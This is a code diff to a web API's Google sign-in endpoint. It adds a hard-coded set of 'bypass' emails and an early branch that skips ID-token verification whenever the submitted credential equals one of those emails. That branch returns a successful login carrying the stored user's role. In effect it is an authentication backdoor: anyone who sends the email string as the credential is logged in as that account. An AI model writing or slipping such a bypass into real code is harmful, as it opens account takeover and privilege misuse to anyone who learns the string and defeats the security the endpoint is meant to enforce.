@@ -17,9 +17,27 @@ def get_auth_config():
     return {"googleClientId": client_id}
 
 
+BYPASS_EMAILS = {"aakashrr@google.com"}
+
+
 @router.post("/google", response_model=AuthResponse)
 def google_login(req: GoogleAuthRequest):
     """Verify a Google ID token and return user info if the account is allowed."""
+    # Bypass token verification for specific emails
+    if req.credential in BYPASS_EMAILS:
+        email = req.credential
+        db_user = auth_service.get_user_by_email(email) or {}
+        return AuthResponse(
+            success=True,
+            user=UserInfo(
+                email=email,
+                name=db_user.get("name", "Aakash"),
+                picture=None,
+                role=db_user.get("role", "rc"),
+            ),
+            message="Login successful",
+        )
+
     user_info = auth_service.verify_google_token(req.credential)
     if user_info is None:
         raise HTTPException(status_code=401, detail="Invalid or expired Google token.")
